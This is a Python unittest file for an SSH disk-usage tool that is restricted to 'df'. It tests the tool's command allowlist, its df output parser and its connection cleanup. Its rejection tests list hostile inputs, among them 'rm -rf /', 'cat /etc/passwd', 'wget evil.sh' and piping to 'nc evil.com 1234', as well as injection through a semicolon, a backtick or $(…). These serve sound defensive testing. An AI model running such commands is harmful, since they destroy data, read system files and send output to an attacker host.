"""Tests for tools.disk — SSH `df -Th` with ZERO side-effects on the remote.

Covers three layers:
1. Command safety (validate_command) — runs BEFORE any network call
2. Pure parser (parse_df_output) — no I/O
3. Handler (check_disk_handler) — uses mocked paramiko to verify wiring + cleanup
"""
import json
import unittest
from unittest.mock import MagicMock, patch

import hermes.tools.ssh.disk  # noqa: F401  — registers the tool as a side effect
from hermes.tools.ssh.disk import (
    ALLOWED_COMMANDS,
    check_disk_handler,
    parse_df_output,
    validate_command,
)


# ============================================================
# Mock helpers
# ============================================================
def _make_channel_file(content: str, exit_code: int = 0):
    """Mimic paramiko's ChannelFile: .read() → bytes, .channel.recv_exit_status() → int."""
    f = MagicMock()
    f.read.return_value = content.encode("utf-8") if content else b""
    f.channel = MagicMock()
    f.channel.recv_exit_status.return_value = exit_code
    return f


def _mock_ssh_client(stdout: str = "", stderr: str = "", exit_code: int = 0):
    """Build a MagicMock that quacks like paramiko.SSHClient."""
    client = MagicMock()
    client.exec_command.return_value = (
        MagicMock(),  # stdin
        _make_channel_file(stdout, exit_code),
        _make_channel_file(stderr, exit_code),
    )
    transport = MagicMock()
    client.get_transport.return_value = transport
    return client, transport


SAMPLE_DF_TH = (
    "Filesystem     Type     Size  Used Avail Use% Mounted on\n"
    "/dev/sda1      ext4      50G  5.0G   42G  10% /\n"
    "/dev/sda2      ext4     100G   92G  7.5G  92% /data\n"
    "tmpfs          tmpfs     16G  120M   16G   1% /tmp\n"
    "/dev/sda3      ext4     200G  180G   10G  95% /var\n"
)


# ============================================================
# 1. Command safety — runs BEFORE any SSH connection
# ============================================================
class ValidateCommandTests(unittest.TestCase):
    """Every allowlisted command must pass; everything else must be rejected."""

    def test_allowlist_contains_only_read_only_commands(self):
        # Defense in depth: assert the constant hasn't drifted
        for cmd in ALLOWED_COMMANDS:
            self.assertTrue(
                cmd.startswith("df"),
                f"non-df command in allowlist: {cmd!r}",
            )

    def test_df_th_is_allowed(self):
        validate_command("df -Th")  # no raise

    def test_df_h_is_allowed(self):
        validate_command("df -h")

    def test_df_alone_is_allowed(self):
        validate_command("df")

    def test_other_commands_rejected(self):
        with self.assertRaises(ValueError) as cm:
            validate_command("rm -rf /")
        self.assertIn("not allowed", str(cm.exception))

    def test_bash_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("bash")

    def test_sh_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("sh")

    def test_cat_etc_passwd_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("cat /etc/passwd")

    def test_injection_via_semicolon_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th; rm -rf /")

    def test_injection_via_and_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df && wget evil.sh")

    def test_injection_via_or_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df || rm -rf /")

    def test_injection_via_pipe_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th | nc evil.com 1234")

    def test_injection_via_redirect_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th > /etc/passwd")

    def test_injection_via_backtick_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th `evil`")

    def test_injection_via_dollar_paren_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th $(whoami)")

    def test_injection_via_newline_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th\nrm -rf /")

    def test_injection_via_carriage_return_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("df -Th\rrm -rf /")

    def test_empty_command_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("")

    def test_whitespace_only_command_rejected(self):
        with self.assertRaises(ValueError):
            validate_command("   ")


# ============================================================
# 2. Pure parser — no I/O
# ============================================================
class ParseDfOutputTests(unittest.TestCase):
    """Parse `df -Th` output. Pure function, no mocking needed."""

    def test_parses_expected_number_of_mounts(self):
        self.assertEqual(len(parse_df_output(SAMPLE_DF_TH)), 4)

    def test_extracts_use_pct_as_integer(self):
        out = parse_df_output(SAMPLE_DF_TH)
        data_mount = next(m for m in out if m["mount"] == "/data")
        self.assertEqual(data_mount["use_pct"], 92)
        self.assertIsInstance(data_mount["use_pct"], int)

    def test_warning_set_at_80_percent_boundary(self):
        # 80% itself should trigger warning
        out = parse_df_output("Filesystem Type Size Used Avail Use% Mounted on\n/dev/sda ext4 10G 8G 2G 80% /\n")
        self.assertTrue(out[0]["warning"])

    def test_critical_set_at_90_percent_boundary(self):
        out = parse_df_output("Filesystem Type Size Used Avail Use% Mounted on\n/dev/sda ext4 10G 9G 1G 90% /\n")
        self.assertTrue(out[0]["critical"])

    def test_no_warning_below_80_percent(self):
        out = parse_df_output("Filesystem Type Size Used Avail Use% Mounted on\n/dev/sda ext4 10G 1G 9G 10% /\n")
        self.assertFalse(out[0]["warning"])
        self.assertFalse(out[0]["critical"])

    def test_results_sorted_by_use_pct_descending(self):
        out = parse_df_output(SAMPLE_DF_TH)
        pcts = [m["use_pct"] for m in out]
        self.assertEqual(pcts, sorted(pcts, reverse=True))

    def test_handles_empty_input(self):
        self.assertEqual(parse_df_output(""), [])

    def test_skips_header_line(self):
        out = parse_df_output(SAMPLE_DF_TH)
        for m in out:
            self.assertNotEqual(m["filesystem"], "Filesystem")

    def test_each_record_has_all_required_fields(self):
        out = parse_df_output(SAMPLE_DF_TH)
        for m in out:
            for key in ("filesystem", "type", "size", "used", "avail", "use_pct", "mount", "warning", "critical"):
                self.assertIn(key, m, f"missing {key!r} in {m}")

    def test_critical_also_implies_warning(self):
        # 95% should be BOTH critical and warning
        out = parse_df_output("Filesystem Type Size Used Avail Use% Mounted on\n/dev/sda ext4 10G 9.5G 0.5G 95% /\n")
        self.assertTrue(out[0]["critical"])
        self.assertTrue(out[0]["warning"])

    def test_skips_unparseable_lines(self):
        bad = "Filesystem Type Size Used Avail Use% Mounted on\nrandom garbage line\n/dev/sda ext4 10G 1G 9G 10% /\n"
        out = parse_df_output(bad)
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["mount"], "/")


# ============================================================
# 3. Handler — mocked SSH, verifies wiring + cleanup + safety ordering
# ============================================================
class CheckDiskHandlerTests(unittest.TestCase):

    def _call(self, args: dict):
        """Invoke the handler and parse the returned JSON string."""
        return json.loads(check_disk_handler(args))

    def test_successful_run_returns_parsed_data(self):
        client, _ = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            result = self._call({
                "host": "1.2.3.4", "username": "root", "password": "secret",
            })
        self.assertIn("mounts", result)
        self.assertEqual(len(result["mounts"]), 4)
        self.assertIn("summary", result)

    def test_summary_counts_warnings_and_criticals(self):
        client, _ = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            result = self._call({
                "host": "1.2.3.4", "username": "root", "password": "secret",
            })
        self.assertEqual(result["summary"]["total_mounts"], 4)
        self.assertEqual(result["summary"]["warning_count"], 2)  # /data 92%, /var 95%
        self.assertEqual(result["summary"]["critical_count"], 2)

    def test_transport_closed_on_success(self):
        client, transport = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        transport.close.assert_called_once()

    def test_transport_closed_on_remote_error(self):
        client, transport = _mock_ssh_client(stdout="", stderr="permission denied", exit_code=1)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            result = self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        self.assertIn("error", result)
        transport.close.assert_called_once()

    def test_transport_closed_on_ssh_exception(self):
        client, transport = _mock_ssh_client(SAMPLE_DF_TH)
        client.exec_command.side_effect = ConnectionError("connection lost")
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            result = self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        self.assertIn("error", result)
        transport.close.assert_called_once()

    def test_command_validation_runs_before_ssh_connect(self):
        # A disallowed command must NOT trigger any SSH activity
        with patch("hermes.tools.ssh.disk._create_ssh_client") as mock_create:
            result = self._call({
                "host": "1.2.3.4", "username": "root", "password": "secret",
                "command": "rm -rf /",
            })
        mock_create.assert_not_called()
        self.assertIn("error", result)
        self.assertIn("not allowed", result["error"])

    def test_command_injection_blocked_before_ssh_connect(self):
        with patch("hermes.tools.ssh.disk._create_ssh_client") as mock_create:
            result = self._call({
                "host": "1.2.3.4", "username": "root", "password": "secret",
                "command": "df -Th; rm -rf /",
            })
        mock_create.assert_not_called()
        self.assertIn("error", result)

    def test_non_zero_exit_returns_error(self):
        client, _ = _mock_ssh_client(stdout="", stderr="command not found", exit_code=127)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            result = self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        self.assertIn("error", result)
        self.assertIn("exit", result["error"])

    def test_missing_host_returns_error_without_connecting(self):
        with patch("hermes.tools.ssh.disk._create_ssh_client") as mock_create:
            result = self._call({"username": "root", "password": "secret"})
        mock_create.assert_not_called()
        self.assertIn("error", result)

    def test_missing_username_returns_error(self):
        result = self._call({"host": "1.2.3.4", "password": "secret"})
        self.assertIn("error", result)
        self.assertIn("username", result["error"])

    def test_missing_password_returns_error(self):
        result = self._call({"host": "1.2.3.4", "username": "root"})
        self.assertIn("error", result)
        self.assertIn("password", result["error"])

    def test_empty_host_returns_error(self):
        result = self._call({"host": "", "username": "root", "password": "secret"})
        self.assertIn("error", result)

    def test_invalid_port_returns_error(self):
        result = self._call({
            "host": "1.2.3.4", "username": "root", "password": "secret",
            "port": 99999,
        })
        self.assertIn("error", result)
        self.assertIn("port", result["error"])

    def test_custom_port_passed_to_ssh(self):
        client, _ = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            self._call({
                "host": "1.2.3.4", "username": "root", "password": "secret",
                "port": 2222,
            })
        # verify connect was called with port=2222
        _, kwargs = client.connect.call_args
        self.assertEqual(kwargs["port"], 2222)

    def test_ssh_client_closed_after_call(self):
        client, _ = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        client.close.assert_called_once()

    def test_sftp_subsystem_never_opened(self):
        # Defense in depth: even if handler runs, no SFTP channel should be opened
        client, _ = _mock_ssh_client(SAMPLE_DF_TH)
        with patch("hermes.tools.ssh.disk._create_ssh_client", return_value=client):
            self._call({"host": "1.2.3.4", "username": "root", "password": "secret"})
        client.open_sftp.assert_not_called()


if __name__ == "__main__":
    unittest.main()
